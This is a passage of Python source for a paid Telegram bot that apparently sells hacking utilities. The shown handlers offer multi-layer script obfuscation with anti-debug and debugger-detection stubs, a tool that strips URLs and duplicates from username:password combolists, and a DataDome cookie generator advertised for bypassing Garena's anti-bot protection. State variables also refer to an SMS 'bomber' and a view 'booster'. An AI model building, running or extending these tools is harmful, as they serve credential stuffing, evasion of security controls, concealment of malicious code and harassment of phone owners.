            user_caption = escape_md(update.message.caption or "")
            caption = (header + user_caption)[:1024]
            await context.bot.send_photo(
                chat_id=ADMIN_ID,
                photo=photo_file.file_id,
                caption=caption,
                parse_mode="Markdown"
            )
        elif update.message.document:
            doc_file = await update.message.document.get_file()
            user_caption = escape_md(update.message.caption or "")
            caption = (header + user_caption)[:1024]
            await context.bot.send_document(
                chat_id=ADMIN_ID,
                document=doc_file.file_id,
                caption=caption,
                parse_mode="Markdown"
            )
        elif update.message.video:
            video_file = await update.message.video.get_file()
            user_caption = escape_md(update.message.caption or "")
            caption = (header + user_caption)[:1024]
            await context.bot.send_video(
                chat_id=ADMIN_ID,
                video=video_file.file_id,
                caption=caption,
                parse_mode="Markdown"
            )
        else:
            await update.effective_message.reply_text(
                "❌ *ᴜɴsᴜᴘᴘᴏʀᴛᴇᴅ ᴍᴇᴅɪᴀ*\n\nᴘʟᴇᴀsᴇ sᴇɴᴅ ᴛᴇxᴛ, ᴘʜᴏᴛᴏ, ᴠɪᴅᴇᴏ, ᴏʀ ᴅᴏᴄᴜᴍᴇɴᴛ.",
                parse_mode="Markdown"
            )
            return

        await update.effective_message.reply_text(
            "✅ *ғᴇᴇᴅʙᴀᴄᴋ sᴇɴᴛ!*\n━━━━━━━━━━━━━━━━━━━━\nᴛʜᴀɴᴋ ʏᴏᴜ! ᴛʜᴇ ᴀᴅᴍɪɴ ʜᴀs ʙᴇᴇɴ ɴᴏᴛɪғɪᴇᴅ.",
            parse_mode="Markdown"
        )
        # Store in FEEDBACKS for /showfeedbacks command
        if update.message.text:
            FEEDBACKS.append({
                "uid": user_id,
                "username": f"@{username}" if username != "N/A" else str(user_id),
                "text": update.message.text[:500],
                "ts": datetime.datetime.now().strftime("%Y-%m-%d %H:%M")
            })
            if len(FEEDBACKS) > 50:
                FEEDBACKS.pop(0)  # keep last 50
        logging.info(f"Feedback received from user {user_id}")

    except Exception as e:
        logging.error(f"Error sending feedback to admin from user {user_id}: {e}")
        await update.effective_message.reply_text(
            "❌ *Error Sending Feedback!*\n\n"
            "An unexpected error occurred. Please try again later.",
            parse_mode="Markdown"
        )
    finally:
        AWAITING_FEEDBACK.discard(user_id)
        await start(update, context)

# ========== CANCEL ACTION ==========
async def cancel_action(update: Update, context: CallbackContext):
    current_message: Message = update.message if update.message else update.callback_query.message if update.callback_query else None
    if not current_message:
        logging.warning("cancel_action called with no effective message.")
        return

    user_id = update.effective_user.id
    
    AWAITING_KEY_INPUT.discard(user_id)
    AWAITING_REVOKE_USER.discard(user_id)
    AWAITING_ANNOUNCEMENT.discard(user_id)
    AWAITING_KEY_DURATION.discard(user_id)
    AWAITING_DELETE_KEY.discard(user_id)
    AWAITING_ROLE_USER_ID.discard(user_id)
    AWAITING_ROLE_SELECTION.pop(user_id, None)
    AWAITING_FEEDBACK.discard(user_id)
    AWAITING_KEY_TIER.discard(user_id)
    AWAITING_KEY_COUNT.discard(user_id)
    AWAITING_KEY_USES.discard(user_id)
    AWAITING_REVOKE_MULTI_KEYS.discard(user_id)
    AWAITING_TOOL_UPLOAD.discard(user_id)
    AWAITING_FILE_UPLOAD.discard(user_id)
    AWAITING_BOMBER_PHONE.discard(user_id)
    AWAITING_BOMBER_AMOUNT.discard(user_id)
    AWAITING_BOMBER_SENDER.discard(user_id)
    AWAITING_BOMBER_MESSAGE.discard(user_id)
    AWAITING_BOOST_URL.discard(user_id)
    BOOSTER_ACTIVE.discard(user_id)

    context.user_data.pop('enc_method', None)
    context.user_data.pop('enc_count', None)
    context.user_data.pop('keys_to_generate_count', None)
    context.user_data.pop('enc_page', None)
    context.user_data.pop('remover_option', None)
    context.user_data.pop('datadome_cookie', None)
    context.user_data.pop('bomber_phone', None)
    context.user_data.pop('bomber_amount', None)
    context.user_data.pop('bomber_sender', None)
    context.user_data.pop('bomber_message', None)
    context.user_data.pop('boost_type', None)
    
    if update.callback_query:
        await safe_answer_callback(update.callback_query, "Operation cancelled.", show_alert=False)
        if is_at_least_role(user_id, "owner"):
            await admin_panel(update, context)
        else:
            await start(update, context, edit_message_id=current_message.message_id)
    else:
        if is_at_least_role(user_id, "owner"):
            await admin_panel(update, context)
        else:
            await start(update, context)

# ========== ENCRYPTION FUNCTIONS ==========
async def start_encryption(update: Update, context: CallbackContext) -> int:
    current_message: Message = update.callback_query.message if update.callback_query else update.message
    if not current_message:
        logging.warning("start_encryption called with no effective message.")
        return ConversationHandler.END

    user_id = update.effective_user.id
    if MAINTENANCE_MODE and user_id != ADMIN_ID:
        if update.callback_query:
            await safe_answer_callback(update.callback_query, "🛠️ Bot is under maintenance!", show_alert=True)
            await safe_edit(current_message, 
                "🛠️ *The Bot Is Maintenance*\n\n"
                "ᴛʜᴇ ʙᴏᴛ ɪs ᴄᴜʀʀᴇɴᴛʟʏ ᴜɴᴅᴇʀɴɢᴏɪɴɢ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ. ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ ʟᴀᴛᴇʀ!",
                parse_mode="Markdown"
            )
        else:
            await current_message.reply_text(
                "🛠️  *Maintenance Mode*\n▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\nThe bot is currently offline.\nBack shortly  ›  @ZyronDevv ",
                parse_mode="Markdown"
            )
        return ConversationHandler.END

    if not has_access(user_id):
        if update.callback_query:
            await safe_answer_callback(update.callback_query, "🔒 Premium Access Required!", show_alert=True)
            await safe_edit(current_message, 
                "🔒 *Premium Access Required!*\n\n"
                "You need active premium access to use the Python Encryptor. Please use an access key or contact @ZyronDevv  to purchase access.",
                parse_mode="Markdown"
            )
        else:
            await current_message.reply_text(
                "🔒 *Premium Access Required!*\n\n"
                "You need active premium access to use the Python Encryptor. Please use an access key or contact @ZyronDevv  to purchase access.",
                parse_mode="Markdown"
            )
        return ConversationHandler.END

    context.user_data['enc_page'] = 0
    reply_markup_methods = build_encryption_keyboard(0)
    message_text = (
        "🔐 *Python Encryptor — Select Security Level* 🔐\n\n"
        "Choose how strongly you want your script protected:\n\n"
        "🟢 *LOW* — Fast, light obfuscation.\n"
        "   Marshal → Zlib → Lzma → B64 (×3 layers)\n\n"
        "🔴 *MAX (NUCLEAR)* — Computationally irreversible.\n"
        "   AES-256 + ChaCha20 + XOR-256 + Bz2 + Gzip + Lzma + Zlib + Marshal\n"
        "   Unique 768-bit combined key generated per file.\n"
        "   Variable names scrambled. Cannot be decoded without the embedded keys.\n\n"
        "⚙️ *Advanced* — Legacy methods (1–44) for fine control."
    )
    if update.callback_query:
        await safe_edit(current_message, message_text, reply_markup=reply_markup_methods, parse_mode='Markdown')
    else:
        await current_message.reply_text(message_text, reply_markup=reply_markup_methods, parse_mode='Markdown')
    return SELECTING_ENC_METHOD

async def enc_handle_pagination(update: Update, context: CallbackContext) -> int:
    query = update.callback_query
    try:
        await safe_answer_callback(query)
    except Exception:
        pass

    current_message: Message = query.message

    try:
        new_page = int(query.data.split('_')[2])
    except (IndexError, ValueError):
        await safe_answer_callback(query, "Invalid page action.", show_alert=True)
        return SELECTING_ENC_METHOD

    context.user_data['enc_page'] = new_page
    
    reply_markup_methods = build_encryption_keyboard(context.user_data['enc_page'])
    await current_message.edit_reply_markup(reply_markup=reply_markup_methods)
    
    return SELECTING_ENC_METHOD

async def handle_enc_method_callback(update: Update, context: CallbackContext) -> int:
    query = update.callback_query
    try:
        await safe_answer_callback(query)
    except Exception:
        pass

    current_message: Message = query.message

    try:
        method_str = query.data.replace("enc_method_", "")
        method = int(method_str)

        valid = (1 <= method <= 44 and method != 43) or method in (100, 200)
        if not valid:
            await safe_edit(current_message, "\u26d4\ufe0f Invalid method. Please choose from the buttons.", parse_mode="Markdown")
            return SELECTING_ENC_METHOD

        context.user_data["enc_method"] = method
        context.user_data.pop("enc_page", None)

        if method in (100, 200):
            level_name = "\U0001f7e2 LOW  SECURITY" if method == 100 else "\U0001f534 MAX  SECURITY  (NUCLEAR)"
            level_desc = (
                "Marshal \u2192 Zlib \u2192 Lzma \u2192 B64  (\xd73 layers)\nFast, light obfuscation."
            ) if method == 100 else (
                "Marshal \u2192 Zlib \u2192 Lzma \u2192 Gzip \u2192 Bz2 \u2192 XOR-256 \u2192 AES-256-EAX \u2192 ChaCha20\n"
                "Variable names scrambled. Unique 768-bit combined key per file.\n"
                "Computationally irreversible without the embedded keys."
            )
            context.user_data["enc_count"] = 1
            await safe_edit(current_message, 
                f"\u2705 *Security level selected:*\n\n"
                f"*{level_name}*\n\n"
                f"`{level_desc}`\n\n"
                f"\U0001f40d Now please *upload your Python file (.py)* to encrypt.",
                parse_mode="Markdown"
            )
            return UPLOADING_ENC_FILE

        await safe_edit(current_message, 
            f"\u2705 Method selected: *`{method}. {ENCRYPTION_METHODS_DISPLAY.get(method, 'Unknown Method')}`*.\n\n"
            f"\U0001fa84 Please enter the *encode count* (1\u201310).\n"
            "Higher counts = stronger encryption but slower.",
            parse_mode="Markdown"
        )
        return SELECTING_ENC_COUNT
    except ValueError:
        await safe_edit(current_message, "\U0001f522 Invalid input. Please use the buttons.", parse_mode="Markdown")
        return SELECTING_ENC_METHOD

async def select_enc_method(update: Update, context: CallbackContext) -> int:
    current_message: Message = update.message
    if not current_message:
        logging.warning("select_enc_method called with no effective message.")
        return SELECTING_ENC_METHOD

    try:
        method = int(update.message.text)
        if not (1 <= method <= 44 and method != 43):
            await current_message.reply_text("⛔️ Invalid method number. Please select a valid number from 1-42 or 44. ⛔️", parse_mode="Markdown")
            await current_message.reply_text("Please choose an encryption method:", reply_markup=build_encryption_keyboard(context.user_data.get('enc_page', 0)), parse_mode="Markdown")
            return SELECTING_ENC_METHOD
        
        context.user_data['enc_method'] = method
        await current_message.reply_text(
            f"✅ Method selected: *`{method}. {ENCRYPTION_METHODS_DISPLAY.get(method, 'Unknown Method')}`*.\n\n"
            f"Now, for the magic touch! 🪄 Please enter the *encode count* (a number between `1` and `10`). "
            "Higher counts mean stronger encryption, but might take longer! ⏳",
            parse_mode="Markdown"
        )
        context.user_data.pop('enc_page', None)
        return SELECTING_ENC_COUNT
    except ValueError:
        await current_message.reply_text("🔢 Invalid input. Please send a *number* corresponding to your chosen method. 🔢", parse_mode="Markdown")
        await current_message.reply_text("Please choose an encryption method:", reply_markup=build_encryption_keyboard(context.user_data.get('enc_page', 0)), parse_mode='Markdown')
        return SELECTING_ENC_METHOD

async def select_enc_count(update: Update, context: CallbackContext) -> int:
    current_message: Message = update.message
    if not current_message:
        logging.warning("select_enc_count called with no effective message.")
        return SELECTING_ENC_COUNT

    try:
        count = int(update.message.text)
        if not (1 <= count <= 10):
            await current_message.reply_text("⚠️ Encode count must be between `1` and `10`. Please try again! ⚠️", parse_mode="Markdown")
            return SELECTING_ENC_COUNT
        
        context.user_data['enc_count'] = count
        await current_message.reply_text(
            f"✨ Encode count set to: `{count}`. Perfect!\n\n"
            f"Almost there! Now, please *upload your Python file (.py)*. "
            "Only `.py` scripts are accepted for this transformation! 🐍",
            parse_mode="Markdown"
        )
        return UPLOADING_ENC_FILE
    except ValueError:
        await current_message.reply_text("🔢 Invalid input. Please send a *number* for the encode count. 🔢", parse_mode="Markdown")
        return SELECTING_ENC_COUNT

async def handle_enc_file_upload(update: Update, context: CallbackContext) -> int:
    current_message: Message = update.message
    if not current_message:
        logging.warning("handle_enc_file_upload called with no effective message.")
        return UPLOADING_ENC_FILE

    document = update.message.document

    if not document.file_name.lower().endswith('.py'):
        await current_message.reply_text("❌ That doesn't look like a Python file. Please upload a `.py` file to proceed. ❌", parse_mode="Markdown")
        return UPLOADING_ENC_FILE

    enc_method = context.user_data.get('enc_method')
    enc_count = context.user_data.get('enc_count')

    if enc_method is None or enc_count is None:
        await current_message.reply_text(
            "Oops! It seems your encryption preferences were lost. "
            "Please start over using /start to select them again. 🔄",
            parse_mode="Markdown"
        )
        return ConversationHandler.END

    await current_message.reply_text(
        f"📩 Received file: `{document.file_name}`. Powering up the encryptor... "
        f"Applying method: `{enc_method}` ({ENCRYPTION_METHODS_DISPLAY.get(enc_method, 'Unknown Method')}) "
        f"with `{enc_count}` layers of encryption. "
        "This might take a moment. Please wait patiently. ✨",
        parse_mode="Markdown"
    )

    try:
        file = await document.get_file()
        file_content_bytes = await file.download_as_bytearray()
        file_content_str = file_content_bytes.decode('utf-8', errors='replace')
    except Exception as e:
        logging.error(f"Error downloading file: {e}")
        await current_message.reply_text(
            "❌ *Download Error!* Could not download the file. Please try again.",
            parse_mode="Markdown"
        )
        return ConversationHandler.END

    # ── File size guard ──────────────────────────────────────────────────
    file_size_kb = len(file_content_bytes) / 1024
    MAX_SIZE_KB = 500
    if file_size_kb > MAX_SIZE_KB:
        await current_message.reply_text(
            f"❌ *File too large!*\n\n"
            f"Your file is `{file_size_kb:.0f} KB`. Max supported size is `{MAX_SIZE_KB} KB`.\n\n"
            f"Please split your file into smaller parts and encrypt each one separately.",
            parse_mode="Markdown"
        )
        return ConversationHandler.END

    # ── Status message (keep-alive during long encryption) ───────────────
    status_msg = await current_message.reply_text(
        f"🔒 *Encrypting* `{document.file_name}` *({file_size_kb:.0f} KB)...*\n"
        f"Method: `{ENCRYPTION_METHODS_DISPLAY.get(enc_method, str(enc_method))}`\n\n"
        f"⏳ Please wait, this may take up to 2 minutes for large files.",
        parse_mode="Markdown"
    )

    # Periodic keep-alive edits so Telegram doesn't think the bot is dead
    _enc_done = False
    async def _keepalive():
        dots = 0
        while not _enc_done:
            await asyncio.sleep(8)
            if _enc_done:
                break
            dots = (dots % 3) + 1
            try:
                await safe_edit(status_msg, 
                    f"🔐 *Encrypting* `{document.file_name}` *({file_size_kb:.0f} KB)*{'.' * dots}\n"
                    f"Method: `{ENCRYPTION_METHODS_DISPLAY.get(enc_method, str(enc_method))}`\n\n"
                    f"⏳ Still working, please wait...",
                    parse_mode="Markdown"
                )
            except Exception:
                pass
    _keepalive_task = asyncio.create_task(_keepalive())


    try:
        aes_key_for_this_enc = None
        xor_key_for_decoder = None

        if enc_method == 42:
            aes_key_for_this_enc = AES_KEY

        encryption_result = await encrypt_data_async(file_content_str, enc_method, enc_count)
        _enc_done = True  # stop keepalive
        _keepalive_task.cancel()

        if enc_method == 44:
            encrypted_data, xor_key_for_decoder = encryption_result
        else:
            encrypted_data = encryption_result

        if not isinstance(encrypted_data, bytes):
            encrypted_data = str(encrypted_data).encode("utf-8")

        if enc_method in (100, 200):
            # _encrypt_low / _encrypt_max already return a complete, self-contained stub.
            # The stub is bytes; just prepend the anti-debug header.
            final_script_content = anti_debug_code() + "\n\n" + encrypted_data.decode("utf-8")
        else:
            # Legacy methods: wrap payload in decoder stub.
            decoder_stub = generate_decoder_stub(enc_method, aes_key_for_this_enc, xor_key_for_decoder)
            encrypted_data_str = base64.b64encode(encrypted_data).decode("utf-8")
            final_script_content = anti_debug_code() + "\n\n" + decoder_stub.format(repr(encrypted_data_str))
        
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        method_display = ENCRYPTION_METHODS_DISPLAY.get(enc_method, f"Method_{enc_method}")
        clean_method_name = re.sub(r'[^\w\-_\. ]', '_', method_display)
        encrypted_filename = f"encrypted_{clean_method_name}_{timestamp}.py"
        
        encrypted_filepath = GENERATED_DIR / encrypted_filename
        
        with open(encrypted_filepath, 'w', encoding='utf-8') as f:
            f.write(final_script_content)

        if enc_method == 100:
            sec_badge = "🟢 LOW  SECURITY"
            sec_detail = "Marshal → Zlib → Lzma → B64  (×3 layers)"
        elif enc_method == 200:
            sec_badge = "🔴 MAX  SECURITY  (NUCLEAR)"
            sec_detail = "AES-256-EAX + ChaCha20 + XOR-256 + Bz2 + Gzip + Lzma + Zlib + Marshal"
        else:
            sec_badge = f"Legacy Method {enc_method}"
            sec_detail = method_display

        with open(encrypted_filepath, 'rb') as f:
            caption = (
                f"🔐 *Python Encryption Successful!* 🔐\n\n"
                f"📄 *Original File:* `{document.file_name}`\n"
                f"🛡️ *Security Level:* `{sec_badge}`\n"
                f"🔬 *Algorithm:* `{sec_detail}`\n"
                f"⏰ *Encrypted On:* `{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n\n"
                f"✨ *Protection Features:*\n"
                f"• Nuclear anti-debug watchdog (background thread)\n"
                f"• Timing + frame + OS-level debugger detection\n"
                f"• Self-contained decryption stub\n"
                f"• Variable names scrambled (MAX only)\n"
                f"• File auto-deletes in 3 minutes\n\n"
                f"⚠️ *Note:* This file will self-delete in 3 minutes for security."
            )
            
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=f,
                filename=encrypted_filename,
                caption=caption,
                parse_mode="Markdown"
            )

        asyncio.create_task(delete_generated_file(encrypted_filepath))
        
        # Track per-user encryption stat (#8)
        uid = update.effective_user.id if update.effective_user else None
        if uid:
            USER_STATS.setdefault(uid, {})["encrypt_count"] = USER_STATS[uid].get("encrypt_count", 0) + 1

        # Send completion message
        await current_message.reply_text(
            "🎉 *Encryption Process Complete!* 🎉\n\n"
            "Your Python script has been successfully encrypted with the highest level of protection available!\n\n"
            "✅ *What's Next:*\n"
            "1. Download the encrypted file above\n"
            "2. The file contains a self-decoding mechanism\n"
            "3. It will automatically delete in 3 minutes\n"
            "4. For maximum security, use the file immediately\n\n"
            "🛡️ *Security Features Applied:*\n"
            "• Multi-layer encryption\n"
            "• Anti-debug protection\n"
            "• Self-contained decryption\n"
            "• Auto-expiration system",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔐 ᴇɴᴄʀʏᴘᴛ ᴀɴᴏᴛʜᴇʀ ғɪʟᴇ", callback_data="start_encryption")],
                [InlineKeyboardButton("⬅️ ʙᴀᴄᴋ ᴛᴏ ᴍᴀɪɴ ᴍᴇɴᴜ", callback_data="back_to_main_menu")]
            ])
        )

        logging.info(f"User {update.effective_user.id} encrypted file {document.file_name} with method {enc_method}, count {enc_count}")
        record_tool_use("encrypt")

    except SyntaxError as e:
        _enc_done = True
        _keepalive_task.cancel()
        error_msg = f"❌ *Syntax Error in Your Script!*\n\nYour Python file contains syntax errors that prevent encryption.\n\n*Error Details:*\n```\n{str(e)}\n```\n\nPlease fix the errors and try again."
        await safe_edit(status_msg, error_msg, parse_mode="Markdown")
        logging.error(f"Syntax error during encryption: {e}")
        _enc_done = True
        _keepalive_task.cancel()
    except Exception as e:
        error_msg = f"❌ *Encryption Failed!*\n\nAn unexpected error occurred during encryption.\n\n*Error:* `{str(e)}`\n\nPlease try again with a different method or file."
        await safe_edit(status_msg, error_msg, parse_mode="Markdown")
        logging.error(f"Error during encryption process: {e}")

    context.user_data.pop('enc_method', None)
    context.user_data.pop('enc_count', None)
    context.user_data.pop('enc_page', None)
    
    return ConversationHandler.END

async def cancel_encryption(update: Update, context: CallbackContext) -> int:
    current_message: Message = update.message if update.message else update.callback_query.message if update.callback_query else None
    if not current_message:
        logging.warning("cancel_encryption called with no effective message.")
        return ConversationHandler.END

    user_id = update.effective_user.id
    
    context.user_data.pop('enc_method', None)
    context.user_data.pop('enc_count', None)
    context.user_data.pop('enc_page', None)
    
    await current_message.reply_text(
        "❌ *Encryption cancelled.*\n\nReturning to main menu...",
        parse_mode="Markdown"
    )
    
    await start(update, context)
    return ConversationHandler.END

# ========== URL & DUPLICATE REMOVER FUNCTIONS ==========
async def url_duplicate_remover_menu(update: Update, context: CallbackContext):
    current_message: Message = update.callback_query.message if update.callback_query else update.message
    if not current_message:
        return

    user_id = update.effective_user.id
    if MAINTENANCE_MODE and user_id != ADMIN_ID:
        await safe_edit(current_message, f"🛠️  *Maintenance Mode*\n{LINE}\nBack shortly. Contact @ZyronDevv ", parse_mode="Markdown")
        return

    if not has_access(user_id):
        await safe_edit(current_message, "🔒 *ᴘʀᴇᴍɪᴜᴍ ᴀᴄᴄᴇss ʀᴇǫᴜɪʀᴇᴅ!*\n\nᴄᴏɴᴛᴀᴄᴛ @ZyronDevv  ᴛᴏ ɢᴇᴛ ᴀ ᴋᴇʏ.", parse_mode="Markdown")
        return

    keyboard = [
        [InlineKeyboardButton("🔗 ʀᴇᴍᴏᴠᴇ ᴜʀʟs", callback_data="remove_urls")],
        [InlineKeyboardButton("🧹 ʀᴇᴍᴏᴠᴇ ᴅᴜᴘʟɪᴄᴀᴛᴇs", callback_data="remove_duplicates")],
        [InlineKeyboardButton("⬅️ ʙᴀᴄᴋ ᴛᴏ ᴍᴀɪɴ ᴍᴇɴᴜ", callback_data="back_to_main_menu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    message_text = (
        "🛠️ *ᴜʀʟ & ᴅᴜᴘʟɪᴄᴀᴛᴇ ʀᴇᴍᴏᴠᴇʀ* 🛠️\n\n"
        "Choose an option to process your files:\n\n"
        "• *ʀᴇᴍᴏᴠᴇ ᴜʀʟs*: Extract only username:password from lines containing URLs\n"
        "• *ʀᴇᴍᴏᴠᴇ ᴅᴜᴘʟɪᴄᴀᴛᴇs*: Remove duplicate credentials from your file\n\n"
        "📝 *sᴜᴘᴘᴏʀᴛ ғᴏʀᴍᴀᴛs*: Text files with credentials in format `username:password` or `url:username:password`"
    )

    if update.callback_query:
        await safe_edit(current_message, message_text, reply_markup=reply_markup, parse_mode="Markdown")
    else:
        await current_message.reply_text(message_text, reply_markup=reply_markup, parse_mode="Markdown")

async def start_url_removal(update: Update, context: CallbackContext):
    current_message: Message = update.callback_query.message
    await safe_edit(current_message, 
        "🔗 *ᴜʀʟ ʀᴇᴍᴏᴠᴀʟ ᴛᴏᴏʟ*\n\n"
        "Please upload a text file containing credentials.\n\n"
        "📝 *ғᴏʀᴍᴀᴛ ᴇxᴀᴍᴘʟᴇs:*\n"
        "• `https://example.com:username:password`\n"
        "• `username:password`\n"
        "• Any format with URLs and credentials\n\n"
        "The tool will extract only the `username:password` parts.",
        parse_mode="Markdown"
    )
    context.user_data['remover_option'] = 'remove_urls'
    AWAITING_FILE_UPLOAD.add(update.effective_user.id)

async def start_duplicate_removal(update: Update, context: CallbackContext):
    current_message: Message = update.callback_query.message
    await safe_edit(current_message, 
        "🧹 *ᴅᴜᴘʟɪᴄᴀᴛᴇ ʀᴇᴍᴏᴠᴀʟ ᴛᴏᴏʟ*\n\n"
        "Please upload a text file containing credentials.\n\n"
        "📝 *ғᴏʀᴍᴀᴛ ᴇxᴀᴍᴘʟᴇs:*\n"
        "• `username:password`\n"
        "• Any credentials format\n\n"
        "The tool will remove all duplicate entries and keep only unique credentials.",
        parse_mode="Markdown"
    )
    context.user_data['remover_option'] = 'remove_duplicates'
    AWAITING_FILE_UPLOAD.add(update.effective_user.id)

async def handle_file_processing(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id not in AWAITING_FILE_UPLOAD:
        return

    document = update.message.document
    
    if not document.file_name.endswith('.txt'):
        await update.effective_message.reply_text("❌ *Please upload a .txt file!*")
        AWAITING_FILE_UPLOAD.discard(user_id)
        return

    processing_msg = await update.effective_message.reply_text("📥 *Downloading file...*")

    try:
        file = await document.get_file()
        file_content = await file.download_as_bytearray()
        
        # Save uploaded file temporarily
        input_filename = f"temp_upload_{user_id}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        input_filepath = GENERATED_DIR / input_filename
        
        with open(input_filepath, "wb") as f:
            f.write(file_content)
        
        # Process the file
        remover = URLDuplicateRemover()
        option = context.user_data.get('remover_option')
        
        if option == 'remove_urls':
            await safe_edit(processing_msg, "🔗 *ʀᴇᴍᴏᴠɪɴɢ ᴜʀʟs ᴀɴᴅ ᴇxᴛʀᴀᴄᴛɪɴɢ ᴄʀᴇᴅᴇɴᴛɪᴀʟs...*")
            remove_duplicates = False
            process_type = "URL removal"
        else:  # remove_duplicates
            await safe_edit(processing_msg, "🧹 *ʀᴇᴍᴏᴠɪɴɢ ᴅᴜᴘʟɪᴄᴀᴛᴇs ᴄʀᴇᴅᴇɴᴛɪᴀʟs...*")
            remove_duplicates = True
            process_type = "duplicate removal"
        
        # Create output filename
        timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
        if option == 'remove_urls':
            output_filename = f"url_removed_{timestamp}.txt"
        else:
            output_filename = f"duplicates_removed_{timestamp}.txt"
        
        output_filepath = GENERATED_DIR / output_filename
        
        # Process the file
        success, processed, saved = remover.process_file(input_filepath, output_filepath, remove_duplicates)
        
        if success and saved > 0:
            # Send the processed file
            with open(output_filepath, "rb") as f:
                caption = (
                    f"✅ *{process_type.capitalize()} Complete!* ✅\n\n"
                    f"📊 *Processing Statistics:*\n"
                    f"• Processed lines: *{processed}*\n"
                    f"• Saved credentials: *{saved}*\n"
                    f"• Success rate: **{(saved/processed*100):.2f}%**\n\n"
                    f"📁 *Original file:* `{document.file_name}`\n"
                    f"🔄 *Processing type:* {process_type}\n"
                    f"⏰ *Processed on:* {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                    f"✨ *File will auto-delete in 3 minutes for security*"
                )
                
                await context.bot.send_document(
                    chat_id=update.message.chat_id,
                    document=f,
                    filename=output_filename,
                    caption=caption,
                    parse_mode="Markdown"
                )
            
            # Schedule file deletion
            asyncio.create_task(delete_generated_file(input_filepath))
            asyncio.create_task(delete_generated_file(output_filepath))
            
        else:
            await safe_edit(processing_msg, 
                f"❌ *Processing Failed!*\n\n"
                f"No valid credentials found or file processing error.\n"
                f"• Processed lines: {processed}\n"
                f"• Saved credentials: {saved}",
                parse_mode="Markdown"
            )
            
            # Clean up temporary files
            if os.path.exists(input_filepath):
                os.remove(input_filepath)
            if os.path.exists(output_filepath):
                os.remove(output_filepath)

    except Exception as e:
        await safe_edit(processing_msg, f"❌ *Error processing file:* `{str(e)}`", parse_mode="Markdown")
        logging.error(f"Error in file processing: {e}")
    
    AWAITING_FILE_UPLOAD.discard(user_id)
    context.user_data.pop('remover_option', None)
    await start(update, context)

# ========== DATADOME GENERATOR FUNCTIONS ==========
async def datadome_menu(update: Update, context: CallbackContext):
    current_message: Message = update.callback_query.message if update.callback_query else update.message
    if not current_message:
        return

    user_id = update.effective_user.id
    if MAINTENANCE_MODE and user_id != ADMIN_ID:
        await safe_edit(current_message, "🛠️ *Bot is under maintenance!*", parse_mode="Markdown")
        return

    if not has_access(user_id):
        await safe_edit(current_message, "🔒 *ᴘʀᴇᴍɪᴜᴍ ᴀᴄᴄᴇss ʀᴇǫᴜɪʀᴇᴅ!*\n\nᴄᴏɴᴛᴀᴄᴛ @ZyronDevv  ᴛᴏ ɢᴇᴛ ᴀ ᴋᴇʏ.", parse_mode="Markdown")
        return

    keyboard = [
        [InlineKeyboardButton("🔄 ɢᴇɴᴇʀᴀᴛᴇ ᴅᴀᴛᴀᴅᴏᴍᴇ ᴄᴏᴏᴋɪᴇ", callback_data="generate_datadome")],
        [InlineKeyboardButton("📁 ɢᴇɴᴇʀᴀᴛᴇ ᴄᴏᴏᴋɪᴇ ғɪʟᴇ", callback_data="generate_datadome_file")],
        [InlineKeyboardButton("📖 ᴡʜᴀᴛ ɪs ᴅᴀᴛᴀᴅᴏᴍᴇ?", callback_data="datadome_info")],
        [InlineKeyboardButton("⬅️ ʙᴀᴄᴋ ᴛᴏ ᴍᴀɪɴ ᴍᴇɴᴜ", callback_data="back_to_main_menu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    message_text = (
        "🛡️ *DataDome Cookie Generator* 🛡️\n\n"
        "Generate fresh DataDome cookies for bypassing anti-bot protection.\n\n"
        "*Features:*\n"
        "• Generate individual DataDome cookies\n"
        "• Create ready-to-use Python cookie files\n"
        "• Bypass Garena anti-bot protection\n\n"
        "Choose an option below to get started!"
    )

    if update.callback_query:
        await safe_edit(current_message, message_text, reply_markup=reply_markup, parse_mode="Markdown")
    else:
        await current_message.reply_text(message_text, reply_markup=reply_markup, parse_mode="Markdown")

async def generate_datadome_cookie(update: Update, context: CallbackContext):
    current_message: Message = update.callback_query.message
    await safe_edit(current_message, "🔄 *Generating DataDome cookie...* Please wait...")

    try:
        generator = DataDomeGenerator()
        datadome = generator.get_new_datadome()
        
        if datadome:
            result_message = (
                "✅ *DataDome Cookie Generated Successfully!* ✅\n\n"
                f"🍪 *Cookie Value:*\n"
                f"```\n{datadome}\n```\n\n"
                f"📝 *Usage:*\n"
                f"• Use this cookie in your requests to bypass DataDome protection\n"
                f"• Cookie will be valid for a limited time\n"
                f"• Generate a new one when it expires\n\n"
                f"⏰ *Generated:* {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            )
        else:
            result_message = (
                "❌ *Failed to Generate DataDome Cookie*\n\n"
                "The cookie generation service might be temporarily unavailable.\n"
                "Please try again later or contact support if the issue persists."
            )
        
        keyboard = [
            [InlineKeyboardButton("🔄 ɢᴇɴᴇʀᴀᴛᴇ ᴀɴᴏᴛʜᴇʀ", callback_data="generate_datadome")],
            [InlineKeyboardButton("📁 ɢᴇɴᴇʀᴀᴛᴇ ғɪʟᴇ", callback_data="generate_datadome_file")],
            [InlineKeyboardButton("⬅️ ʙᴀᴄᴋ ᴛᴏ ᴍᴇɴᴜ", callback_data="datadome_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await safe_edit(current_message, result_message, reply_markup=reply_markup, parse_mode="Markdown")
        if datadome:
            uid = update.callback_query.from_user.id if update.callback_query else None
            if uid:
                USER_STATS.setdefault(uid, {})["datadome_count"] = USER_STATS[uid].get("datadome_count", 0) + 1
        
    except Exception as e:
        error_message = f"❌ *Error generating cookie:* `{str(e)}`"
        await safe_edit(current_message, error_message, parse_mode="Markdown")

async def generate_datadome_file(update: Update, context: CallbackContext):
    current_message: Message = update.callback_query.message

    # ── 5-minute generate cooldown check ─────────────────────
    if await check_generate_cooldown(update):
        return
    # ─────────────────────────────────────────────────────────

